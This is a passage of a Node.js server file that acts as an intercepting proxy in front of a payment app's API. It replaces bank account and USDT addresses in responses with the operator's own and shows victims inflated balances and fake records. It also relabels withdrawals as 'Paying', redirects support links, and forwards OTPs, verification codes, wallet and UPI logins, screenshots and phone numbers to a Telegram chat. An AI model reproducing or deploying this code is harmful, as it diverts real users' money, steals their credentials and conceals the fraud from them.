        str = str.replace(/https?:\/\/[^\s"',\\}]+(qr|QR|qrcode|code)[^\s"',\\}]*/gi, qrUrl);
        try { Object.assign(jsonResp, JSON.parse(str)); } catch(e) {}
      }
    }
    if (data.adminChatId && bot && debugNextResponse) {
      debugNextResponse = false;
      bot.sendMessage(data.adminChatId, `🔍 PaymentOrderDetail:\n${JSON.stringify(jsonResp, null, 2).substring(0, 3500)}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/api/memberRecharge/getUsdtRate', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (data.usdtAddress && jsonResp) replaceUsdtInResponse(jsonResp, data);
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/api/memberManager/getMemberVerificationCode', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1500);
      const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
      bot.sendMessage(data.adminChatId, `🔐 Verification Code [${userId || 'N/A'}]\n\n📝 REQUEST:\n${reqBody}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/api/memberRecharge/memberRechargeList', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});

app.post('/app/api/orderOut/payingSubmit', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      bot.sendMessage(data.adminChatId, `📤 Payment Submit [${userId || 'N/A'}]\nUTR: ${body.utr || body.transactionId || body.referenceNo || 'N/A'}\nOrder: ${body.orderId || body.orderNo || 'N/A'}`).catch(()=>{});
    }
    if (userId) { trackUser(data, userId, `Submit ${body.utr || ''}`); saveData(data).catch(()=>{}); }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/api/orderOut/payingSubmitResult', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      bot.sendMessage(data.adminChatId, `📤 Payment Result [${userId || 'N/A'}]\nOrder: ${req.parsedBody?.orderId || req.parsedBody?.orderNo || 'N/A'}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/api/orderOut/payingSubmitImg', async (req, res) => {
  const data = await loadData();
  try {
    const url = ORIGINAL_API + req.originalUrl;
    const fwd = {};
    for (const [k, v] of Object.entries(req.headers)) {
      const kl = k.toLowerCase();
      if (kl === 'host' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
      fwd[k] = v;
    }
    fwd['host'] = 'api.iukpay.com';
    const opts = { method: req.method, headers: fwd };
    if (req.rawBody && req.rawBody.length > 0) {
      opts.body = req.rawBody;
      fwd['content-length'] = String(req.rawBody.length);
    }
    const response = await fetch(url, opts);
    const respBody = await response.text();
    const respHeaders = {};
    response.headers.forEach((val, key) => {
      const kl = key.toLowerCase();
      if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
        respHeaders[key] = val;
      }
    });
    let jsonResp = null;
    try { jsonResp = JSON.parse(respBody); } catch(e) {}
    const userId = await extractUserId(req, jsonResp);
    const phone = getPhone(data, userId);
    if (data.adminChatId && bot && req.rawBody && req.rawBody.length > 0 && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const contentType = req.headers['content-type'] || '';
      let imageSent = false;
      if (contentType.includes('multipart/form-data')) {
        const boundaryMatch = contentType.match(/boundary=([^\s;]+)/);
        if (boundaryMatch) {
          const boundary = boundaryMatch[1];
          const raw = req.rawBody;
          const boundaryBuf = Buffer.from('--' + boundary);
          const parts = [];
          let startIdx = 0;
          while (true) {
            const idx = raw.indexOf(boundaryBuf, startIdx);
            if (idx === -1) break;
            if (startIdx > 0) parts.push(raw.slice(startIdx, idx));
            startIdx = idx + boundaryBuf.length;
            if (raw[startIdx] === 0x0d) startIdx++;
            if (raw[startIdx] === 0x0a) startIdx++;
          }
          for (const part of parts) {
            const headerEnd = part.indexOf('\r\n\r\n');
            if (headerEnd === -1) continue;
            const headerStr = part.slice(0, headerEnd).toString('utf8');
            if (/content-type:\s*(image\/|application\/octet-stream)/i.test(headerStr) ||
                /filename=.*\.(jpg|jpeg|png|gif|webp|bmp)/i.test(headerStr)) {
              const imageData = part.slice(headerEnd + 4);
              if (imageData.length > 100) {
                try {
                  await bot.sendPhoto(data.adminChatId, imageData, { caption: `📸 UTR Screenshot [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}` }, { filename: 'screenshot.jpg', contentType: 'image/jpeg' });
                  imageSent = true;
                } catch(e) {
                  bot.sendMessage(data.adminChatId, `📸 Image extract failed: ${e.message}\nSize: ${imageData.length} bytes`).catch(()=>{});
                }
              }
              break;
            }
          }
        }
      }
      if (!imageSent) {
        bot.sendMessage(data.adminChatId, `🖼 Payment Image Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nImage could not be extracted\nContent-Type: ${contentType}\nBody size: ${req.rawBody.length} bytes`).catch(()=>{});
      }
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/api/orderOut/pendingSubmitImg', async (req, res) => {
  const data = await loadData();
  try {
    const url = ORIGINAL_API + req.originalUrl;
    const fwd = {};
    for (const [k, v] of Object.entries(req.headers)) {
      const kl = k.toLowerCase();
      if (kl === 'host' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
      fwd[k] = v;
    }
    fwd['host'] = 'api.iukpay.com';
    const opts = { method: req.method, headers: fwd };
    if (req.rawBody && req.rawBody.length > 0) {
      opts.body = req.rawBody;
      fwd['content-length'] = String(req.rawBody.length);
    }
    const response = await fetch(url, opts);
    const respBody = await response.text();
    const respHeaders = {};
    response.headers.forEach((val, key) => {
      const kl = key.toLowerCase();
      if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
        respHeaders[key] = val;
      }
    });
    let jsonResp = null;
    try { jsonResp = JSON.parse(respBody); } catch(e) {}
    const userId = await extractUserId(req, jsonResp);
    const phone = getPhone(data, userId);
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const rawStr = req.rawBody ? req.rawBody.toString('utf8', 0, Math.min(req.rawBody.length, 500)) : '';
      const imgUrls = rawStr.match(/https?:\/\/[^\s"',\r\n]+\.(jpg|jpeg|png|gif|webp)[^\s"',\r\n]*/gi) || [];
      bot.sendMessage(data.adminChatId, `🖼 Pending Image Submit [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}`).catch(()=>{});
      if (imgUrls.length > 0) {
        for (const imgUrl of imgUrls.slice(0, 3)) {
          try { await bot.sendPhoto(data.adminChatId, imgUrl, { caption: `📸 Pending Screenshot [${userId || 'N/A'}]` }); } catch(e) {
            bot.sendMessage(data.adminChatId, `📸 Image URL: ${imgUrl}`).catch(()=>{});
          }
        }
      }
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/api/orderOut/memberOrderOutList', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});

app.all('/app/api/orderOut/searchList', async (req, res) => {
  await transparentProxy(req, res);
});

app.all('/app/api/orderOut/paying', async (req, res) => {
  const data = await loadData();
  const reqUserId = await extractUserId(req, null);
  const reqEff = getEffectiveSettings(data, reqUserId);
  if (reqEff.botEnabled === false) return await transparentProxy(req, res);
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detectedUserId = await extractUserId(req, jsonResp) || reqUserId;
    const eff = getEffectiveSettings(data, detectedUserId);
    const active = eff.botEnabled !== false ? await getActiveBankAndSave(data, detectedUserId) : null;
    const respData = getResponseData(jsonResp);
    if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
      const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
      bot.sendMessage(data.adminChatId, `🔍 PAYING RAW RESPONSE:\n${dump}`).catch(()=>{});
    }
    if (respData && active) {
      if (Array.isArray(respData)) {
        respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
      } else {
        deepReplace(respData, active, {}, 0);
      }
    }
    if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
      const afterDump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
      bot.sendMessage(data.adminChatId, `✅ PAYING AFTER REPLACE:\n${afterDump}`).catch(()=>{});
    }
    const phone = getPhone(data, detectedUserId);
    if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
      const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
      bot.sendMessage(data.adminChatId,
`🔔 💳 Paying
👤 User: ${detectedUserId || 'N/A'}${phone ? ' (' + phone + ')' : ''}
Order: ${rd.orderId || rd.orderNo || 'N/A'}
Amount: ₹${rd.amount || rd.orderAmount || 'N/A'}
Bank: ${active ? active.accountNo : 'N/A'}
Acc: ${active ? active.accountHolder : 'None'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
    if (detectedUserId) { trackUser(data, detectedUserId, 'Paying'); saveData(data).catch(()=>{}); }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('Paying error:', e.message);
    if (!res.headersSent) await transparentProxy(req, res);
  }
});

app.post('/app/api/orderOut/cancel', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const cancelUserId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot && !isLogOff(data, cancelUserId) && !(await isLogOffByToken(data, req))) {
      bot.sendMessage(data.adminChatId, `❌ Order Cancelled\nOrder: ${req.parsedBody?.orderId || req.parsedBody?.orderNo || 'N/A'}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.post('/app/api/memberRecharge/cancelOrder', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const rchgCancelUserId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot && !isLogOff(data, rchgCancelUserId) && !(await isLogOffByToken(data, req))) {
      bot.sendMessage(data.adminChatId, `❌ Recharge Cancelled\nOrder: ${req.parsedBody?.orderId || req.parsedBody?.orderNo || 'N/A'}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/api/memberManager/withdrawHistory', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);

    const whData = getResponseData(jsonResp);
    if (whData) {
      const items = Array.isArray(whData) ? whData
        : whData.list ? whData.list
        : whData.records ? whData.records
        : whData.rows ? whData.rows : null;

      if (items && items.length > 0) {
        const globalCount = data.withdrawOverride || 0;
        let changed = 0;
        const changedDetails = [];

        for (let i = 0; i < items.length; i++) {
          const itemUserId = String(items[i].userId || items[i].memberId || items[i].customerId || '');
          const userOverride = data.userOverrides[itemUserId];
          const perUserCount = userOverride && userOverride.withdrawCount ? userOverride.withdrawCount : 0;
          const effectiveCount = perUserCount || globalCount;

          if (effectiveCount <= 0) continue;

          const userItems = items.filter(it => String(it.userId || it.memberId || it.customerId || '') === itemUserId);
          const userIndex = userItems.indexOf(items[i]);

          if (userIndex < effectiveCount) {
            const statField = items[i].stat !== undefined ? 'stat' : (items[i].status !== undefined ? 'status' : 'state');
            const oldStat = items[i][statField];
            items[i][statField] = 0;
            changedDetails.push(`₹${items[i].amount || 'N/A'} [${itemUserId}] (${oldStat} → 0/Paying)`);
            changed++;
          }
        }

        if (changed > 0 && data.adminChatId && bot) {
          bot.sendMessage(data.adminChatId, `✅ Changed ${changed} withdrawal(s) to Paying:\n${changedDetails.join('\n')}`).catch(()=>{});
        }

        const detectedUserId = await extractUserId(req, jsonResp);
        const eff = getEffectiveSettings(data, detectedUserId);
        if (eff.botEnabled !== false) {
          const bank = getActiveBank(data, detectedUserId);
          if (bank) {
            items.forEach(item => { deepReplace(item, bank, {}, 0); });
          }
        }
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
});

app.all('/app/api/memberManager/withdrawHistoryDetail', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, '📋 Withdraw Detail');
});

app.all('/app/api/memberManager/mine', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const respData = getResponseData(jsonResp);
    const uid = respData?.memberCodeId || respData?.memberId || respData?.userId || '';
    const effectiveUserId = uid ? String(uid) : '';
    let phone = '';
    let bal = '';
    if (respData && typeof respData === 'object') {
      phone = respData.memberPhone || respData.phone || respData.mobile || respData.telephone || '';
      bal = respData.balance ?? respData.availableBalance ?? respData.amount ?? '';
      if (!effectiveUserId && !phone) {
        for (const [k, v] of Object.entries(respData)) {
          if (!phone && /phone|mobile|tel/i.test(k) && v) phone = String(v);
        }
      }
    }
    let sellCutReport = null;
    if (effectiveUserId && respData && typeof respData === 'object') {
      const userOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
      if (userOvr && userOvr.sellControl) {
        const realBalance = parseFloat(respData.balance ?? respData.availableBalance ?? respData.amount ?? 0) || 0;
        const lastReal = userOvr.lastRealBalance;
        if (lastReal !== undefined && lastReal !== null) {
          const drop = parseFloat((lastReal - realBalance).toFixed(2));
          if (drop > 0) {
            const desiredCut = 50;
            const compensation = drop > desiredCut ? parseFloat((drop - desiredCut).toFixed(2)) : 0;
            const prevAdded = data.userOverrides[String(effectiveUserId)].addedBalance || 0;
            if (compensation > 0) {
              data.userOverrides[String(effectiveUserId)].addedBalance = parseFloat((prevAdded + compensation).toFixed(2));
            }
            sellCutReport = {
              userId: effectiveUserId,
              phone: phone || '',
              originalCut: drop,
              modifiedCut: drop > desiredCut ? desiredCut : drop,
              compensation: compensation,
              prevAddedBalance: prevAdded,
              newAddedBalance: data.userOverrides[String(effectiveUserId)].addedBalance || prevAdded,
              realBalanceBefore: lastReal,
              realBalanceAfter: realBalance,
              time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
            };
            if (!data.sellHistory) data.sellHistory = [];
            data.sellHistory.push(sellCutReport);
          }
        }
        data.userOverrides[String(effectiveUserId)].lastRealBalance = realBalance;
        data._skipOverrideMerge = true;
        await saveData(data);
      }
    }
    if (effectiveUserId && respData && typeof respData === 'object') {
      const userOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
      const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
      if (addedBal !== 0) {
        const balKeys = ['balance', 'availableBalance', 'totalBalance', 'userBalance', 'amount', 'money', 'coin', 'wallet'];
        for (const bk of balKeys) {
          if (respData[bk] !== undefined) {
            const numBal = parseFloat(respData[bk]) || 0;
            respData[bk] = typeof respData[bk] === 'string'
              ? String(parseFloat((numBal + addedBal).toFixed(2)))
              : parseFloat((numBal + addedBal).toFixed(2));
          }
        }
      }
    }
    sendJson(res, respHeaders, jsonResp, respBody);
    if (effectiveUserId) {
      saveTokenUserId(req, effectiveUserId);
      const freshData = await loadData(true);
      if (!freshData.trackedUsers) freshData.trackedUsers = {};
      const existing = freshData.trackedUsers[String(effectiveUserId)] || {};
      freshData.trackedUsers[String(effectiveUserId)] = {
        ...existing,
        lastAction: 'mine',
        lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        phone: phone || existing.phone || '',
        balance: bal !== '' ? bal : (existing.balance || ''),
        orderCount: existing.orderCount || 0
      };
      freshData._skipOverrideMerge = true;
      saveData(freshData).catch(()=>{});
    }
    if (data.adminChatId && bot) {
      if (sellCutReport) {
        const r = sellCutReport;
        const displayedBalance = parseFloat((r.realBalanceAfter + r.newAddedBalance).toFixed(2));
        bot.sendMessage(data.adminChatId,
          `🔒 SELL CUT INTERCEPTED\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `👤 User: ${r.userId}\n` +
          `📱 Phone: ${r.phone || 'N/A'}\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `📥 Original Cut: ₹${r.originalCut}\n` +
          `✂️ Modified Cut: ₹${r.modifiedCut}\n` +
          `💰 Saved: ₹${r.compensation}\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `🏦 Real Balance: ₹${r.realBalanceBefore} → ₹${r.realBalanceAfter}\n` +
          `📊 Added Balance: ₹${r.prevAddedBalance} → ₹${r.newAddedBalance}\n` +
          `👁️ User Sees: ₹${displayedBalance}\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `🕐 Time: ${r.time}`
        ).catch(()=>{});
      } else {
        const mineOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
        const mineAdded = mineOvr && mineOvr.addedBalance !== undefined ? mineOvr.addedBalance : 0;
        const realBal = bal !== '' ? bal : 'N/A';
        const displayBal = (realBal !== 'N/A' && mineAdded !== 0) ? parseFloat((parseFloat(realBal) + mineAdded).toFixed(2)) : realBal;
        let mineMsg = `👤 Mine [${effectiveUserId || 'N/A'}]\n📱 Phone: ${phone || 'N/A'}`;
        if (mineAdded !== 0) {
          mineMsg += `\n━━━━━━━━━━━━━━━━━━`;
          mineMsg += `\n🏦 Real Balance: ₹${realBal}`;
          mineMsg += `\n➕ Bot Added: ₹${mineAdded}`;
          mineMsg += `\n👁️ User Sees: ₹${displayBal}`;
        } else {
          mineMsg += `\n💰 Balance: ₹${realBal}`;
        }
        bot.sendMessage(data.adminChatId, mineMsg).catch(()=>{});
      }
    }
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/api/memberManager/balanceRecordList', async (req, res) => {
  const data = await loadData(true);
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    let detectedUserId = await extractUserId(req, jsonResp);
    if (detectedUserId) saveTokenUserId(req, detectedUserId);

    if (!detectedUserId) {
      const listCheck = getResponseData(jsonResp);
      if (listCheck && typeof listCheck === 'object') {
        const arr = listCheck.records || listCheck.list || listCheck.rows || (Array.isArray(listCheck) ? listCheck : []);
        if (arr.length > 0) {
          const first = arr[0];
          const rid = first.memberCodeId || first.userId || first.memberId || '';
          if (rid) { detectedUserId = String(rid); saveTokenUserId(req, detectedUserId); }
        }
      }
    }

    const eff = getEffectiveSettings(data, detectedUserId);
    const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(data, detectedUserId) : null;

    const listData = getResponseData(jsonResp);

    const userOvr = data.userOverrides && data.userOverrides[String(detectedUserId)];
    const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
    const fakeRecords = (userOvr && userOvr.quotaRecords && userOvr.quotaRecords.length > 0)
      ? [...userOvr.quotaRecords].reverse()
      : [];

    const body = req.parsedBody || req.body || {};
    const qry = req.query || {};
    const pageNum = parseInt(body.pageNo || body.pageNum || body.page || body.current || qry.pageNo || qry.pageNum || qry.page || qry.current || '1') || 1;
    const shouldInject = pageNum === 1 && fakeRecords.length > 0;

    if (data.adminChatId && bot) {
      const ldKeys = listData ? (Array.isArray(listData) ? '[Array:' + listData.length + ']' : Object.keys(listData).join(',')) : 'null';
      const qrCount = userOvr ? (userOvr.quotaRecords ? userOvr.quotaRecords.length : 'no-qr') : 'no-ovr';
      bot.sendMessage(data.adminChatId, `🔍 QuotaDebug\nUID: ${detectedUserId}\nOvr: ${!!userOvr} | QR: ${qrCount}\nInject: ${shouldInject} | Page: ${pageNum}\nKeys: ${ldKeys}`).catch(()=>{});
    }

    if (listData) {
      if (addedBal !== 0 && typeof listData === 'object' && !Array.isArray(listData)) {
        addBonusToBalanceFields(listData, addedBal);
      }

      const applyToItem = (item) => {
        const itemUserId = item.userId ? String(item.userId) : (item.memberId ? String(item.memberId) : detectedUserId);
        const itemEff = getEffectiveSettings(data, itemUserId);
        const itemActive = (itemEff.botEnabled !== false) ? getActiveBank(data, itemUserId) : null;
        if (itemActive) { const origVals = {}; deepReplace(item, itemActive, origVals, 0); }
        if (itemEff.depositSuccess) markDepositSuccess(item);
      };

      const targetArr = Array.isArray(listData) ? listData
        : (listData.lists && Array.isArray(listData.lists)) ? listData.lists
        : (listData.list && Array.isArray(listData.list)) ? listData.list
        : (listData.records && Array.isArray(listData.records)) ? listData.records
        : (listData.rows && Array.isArray(listData.rows)) ? listData.rows
        : (listData.content && Array.isArray(listData.content)) ? listData.content
        : null;

      if (targetArr) {
        if (shouldInject) {
          targetArr.unshift(...fakeRecords);
          if (!Array.isArray(listData)) {
            if (listData.total !== undefined) listData.total += fakeRecords.length;
            if (listData.totalCount !== undefined) listData.totalCount += fakeRecords.length;
            if (listData.totalElements !== undefined) listData.totalElements += fakeRecords.length;
          }
        }
        targetArr.forEach(applyToItem);
      } else if (typeof listData === 'object') {
        applyToItem(listData);
      }
    }

    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) {
    console.error('balanceRecordList error:', req.originalUrl, e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
});

app.all('/app/api/memberManager/dataStatistics', async (req, res) => {
  await proxyAndAddBonus(req, res);
});

app.all('/app/api/memberManager/bindRobotDetail', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const respData = getResponseData(jsonResp);
    if (data.adminChatId && bot) {
      const phone = getPhone(data, userId);
      const rd = (respData && typeof respData === 'object') ? respData : {};
      bot.sendMessage(data.adminChatId, `🤖 Robot Bind Details\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n📱 Telegram Bot: ${rd.telegramBotLink || rd.botLink || 'N/A'}\n🔑 Bind Code: ${rd.telegramBindCode || rd.bindCode || rd.code || 'N/A'}\n🔗 Bound: ${rd.isBound !== undefined ? rd.isBound : (rd.bound !== undefined ? rd.bound : 'N/A')}\n📊 Full: ${JSON.stringify(rd).substring(0, 500)}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

app.all('/app/api/orderOut/receiveOcr', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const ocrUserId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot && !isLogOff(data, ocrUserId) && !(await isLogOffByToken(data, req))) {
      bot.sendMessage(data.adminChatId, `📸 OCR Received\n${JSON.stringify(req.parsedBody || {}).substring(0, 500)}`).catch(()=>{});
    }
    sendJson(res, respHeaders, jsonResp, respBody);
  } catch(e) { await transparentProxy(req, res); }
});

const WALLET_INTERCEPT_ENDPOINTS = [
  '/app/api/v1/wallet/list',
  '/app/api/v1/wallet/authStep',
  '/app/api/v1/wallet/security',
  '/app/api/v1/wallet/equipmentSendOtp',
  '/app/api/v1/wallet/sendOtp',
  '/app/api/v1/wallet/bindUpi',
  '/app/api/v1/wallet/queryUpi',
  '/app/api/v1/wallet/login',
  '/app/api/v1/upi/list',
  '/app/api/v1/upi/switch'
];

for (const ep of WALLET_INTERCEPT_ENDPOINTS) {
  app.all(ep, async (req, res) => {
    const data = await loadData();
    try {
      const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
      const userId = await extractUserId(req, jsonResp);
      const phone = getPhone(data, userId);
      if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
        const reqBody = JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1500);
        const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
        bot.sendMessage(data.adminChatId, `🔐 ${req.originalUrl}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n\n📝 REQUEST:\n${reqBody}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
      }
      sendJson(res, respHeaders, jsonResp, respBody);
    } catch(e) { await transparentProxy(req, res); }
  });
}

app.all('/app/api/customer/list', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const respData = getResponseData(jsonResp);
    if (respData && Array.isArray(respData)) {
      for (const item of respData) {
        if (item && typeof item === 'object') {
          for (const [k, v] of Object.entries(item)) {
            if (typeof v === 'string' && (v.includes('http') || v.includes('t.me') || v.includes('telegram') || v.includes('whatsapp') || v.includes('wa.me'))) {
              item[k] = 'https://t.me/iukpay_support';
            }
          }
          if (item.url) item.url = 'https://t.me/iukpay_support';
          if (item.link) item.link = 'https://t.me/iukpay_support';
          if (item.serviceUrl) item.serviceUrl = 'https://t.me/iukpay_support';
          if (item.customerUrl) item.customerUrl = 'https://t.me/iukpay_support';
          if (item.contactUrl) item.contactUrl = 'https://t.me/iukpay_support';
        }
      }
    } else if (respData && typeof respData === 'object') {
      for (const [k, v] of Object.entries(respData)) {
        if (typeof v === 'string' && (v.includes('http') || v.includes('t.me') || v.includes('telegram') || v.includes('whatsapp') || v.includes('wa.me'))) {
          respData[k] = 'https://t.me/iukpay_support';
        }
      }
    }
    if (jsonResp) {
      const str = JSON.stringify(jsonResp);
      const replaced = str.replace(/https?:\/\/[^\s"',\\\]}>]+/gi, 'https://t.me/iukpay_support');
      const newJson = JSON.parse(replaced);
      sendJson(res, respHeaders, newJson, replaced);
    } else {
      sendJson(res, respHeaders, jsonResp, respBody);
    }
  } catch(e) { await transparentProxy(req, res); }
});

app.all('*', async (req, res) => {
  const data = cachedData || await loadData();
  if (!data.usdtAddress && !data.botEnabled) {
    try {
      const { response, respBody, respHeaders } = await proxyFetch(req);
      res.writeHead(response.status, respHeaders);
      res.end(respBody);
    } catch(e) {
      if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
    }
    return;
  }
  await transparentProxy(req, res);
});

module.exports = app;
